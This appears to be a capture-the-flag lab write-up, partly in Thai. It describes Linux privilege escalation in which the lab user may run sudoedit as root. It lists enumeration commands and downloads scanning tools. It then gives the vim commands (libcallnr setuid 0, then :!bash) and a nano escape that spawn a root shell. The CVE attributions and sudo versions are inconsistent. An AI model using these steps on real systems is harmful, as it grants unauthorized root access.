
# 1 brief

`noob:N00bP@assw0rd`
just escalate to root and read flag

---

# 2 #OG 

```
next lab... priv escalation

user:pass cred provided, just need to escalate to root and read flag
```

`>> PRIVESC_MODE_ACTIVATED._GATHER_INTEL_FIRST.` 🔍⚡

**FIRST COMMANDS TO RUN AFTER LOGIN:**

```bash
# 1. Basic system info
uname -a
cat /etc/os-release

# 2. Current user context
whoami
id
sudo -l

# 3. Network info
ip a
netstat -tulpn 2>/dev/null || ss -tulpn

# 4. Processes
ps auxf

# 5. SUID binaries
find / -perm -4000 2>/dev/null

# 6. Capabilities
getcap -r / 2>/dev/null

# 7. Cron jobs
ls -la /etc/cron* /var/spool/cron/ 2>/dev/null
crontab -l

# 8. Writable files
find / -writable 2>/dev/null | grep -v proc
```

**COMMON PRIVESC VECTORS:**
- **SUDO rights** (`sudo -l`)
- **SUID binaries** (find / -perm -4000)
- **Capabilities** (getcap -r /)
- **Cron jobs** (writable scripts, path hijacking)
- **Kernel exploits** (uname -a)
- **Services running as root** (ps aux)
- **Writable system files**

**SHARE THE OUTPUT AND WE'LL FIND THE PATH TO ROOT.** 🚀

What's the initial access method? SSH? Web shell? What user are you starting as?

---

# 3 investigation

```
noob@machine-0wskyurtvijlfnrsmgwy-0ec24-68c9d4f4bc-qpl5p:~$ sudo -l
User noob may run the following commands on
        machine-0wskyurtvijlfnrsmgwy-0ec24-68c9d4f4bc-qpl5p:
    (root) NOPASSWD: sudoedit /etc/test.txt
```

---

# 4 lse.sh scan

```plaintext
wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
```

```
[!] cve-2023-22809 Sudoedit bypass in Sudo <= 1.9.12p1..................... yes!
---
Vulnerable! sudo version: 1.8.16-0ubuntu1.10
```

---

# 5 cve-2023-22809

https://www.cve.org/CVERecord?id=CVE-2023-22809
```
In Sudo before 1.9.12p2, the sudoedit (aka -e) feature mishandles extra arguments passed in the user-provided environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to append arbitrary entries to the list of files to process. This can lead to privilege escalation. Affected versions are 1.8.0 through 1.9.12.p1. The problem exists because a user-specified editor may contain a "--" argument that defeats a protection mechanism, e.g., an EDITOR='vim -- /path/to/extra/file' value.
```

nope

---

# 6 solution

1. Login เข้าสู่ระบบ

2. Download sudo_killer

```shell
wget https://github.com/TH3xACE/SUDO_KILLER/archive/refs/heads/master.zip 
```

3. Unzip file

```shell
Unzip master.zip
```

4. Run SUDO_KILLER

```shell
cd SUDO_KILLER-master/
./SUDO_KILLERv2.2.2.sh
```

![](https://lh4.googleusercontent.com/BtAc2m3byq04uztDdnKtcxRgTteZhXKuxUjgr3rPLxcwHy69dU9_uor7KLn5BNFXgrz_6cwnI3IHHbxv9Y-pwpAlJkY08F5XRx26mFME1K9xAaizXFntWHYGN-_b2SuSGf7ZvyA35ZqRQNGu3Q)

5.จากผลการรัน script จะพบว่าเราสามารถใช้งาน sudoedit ได้ ประกอบกับ sudo version 1.9.5 จึงไปตรวจสอบใน Google เพิ่มเติม พบว่าสามารถโจมตีเป็นช่องโหว่ CVE-2021-23240 ได้

![](https://lh4.googleusercontent.com/IJqVsCJ4qNntap3aEHLq5ug06-6sLL5z3nxz4vbR6-GDn15Nm3SCAikV0d-0Q07XTdjJm2X9maZXNIdO3-u6fOijEwoVTdU2A98b-nAW4bGtgo18YwwH9g5tIlo4wIUyNRhpScLTgS3FVTrEbQ)

6. ใช้งาน sudoedit ไปยังไฟล์ที่ user สามารถเข้าถึงได้

```bash
sudoedit /etc/test.txt
```

7. ใช้งาน function libcallnr เพื่อเรียกใช้งาน setuid() คือการกำหนด user id ของ process โดยจะใช้คำสั่งเป็น

```bash
:call libcallnr("libc.so.6","setuid",0)
```

  
8. เรียกใช้งาน interactive shell

```bash
:!bash
```

9. จากนั้นเข้าไปตรวจสอบ flag ภายใน `/root`

---

# 7 sum

`ssh noob:N00bP@ssw0rd`
`sudo -l` >>> `(root) NOPASSWD: sudoedit /etc/test.txt`

`sudoedit` as noob with root authz, no password authn
editor = `vim` <<< command injection

2-step injection (in vim command console):
> 1. switch user id: noob(1000) -> root(0)
> > `:call libcallnr("libc.so.6","setuid",0)`
> 2. call shell, or any command as root
> > `:!whoami` >>> `root`
> > `:!bash` >>> terminal as root

[more about cve-2021-23240](./supp/cve-2021-23240)


### 7-supp for nano
```
ctrl+r >>> ctrl+x >>> reset; sh 1>&0 2>&0
```

---

# end
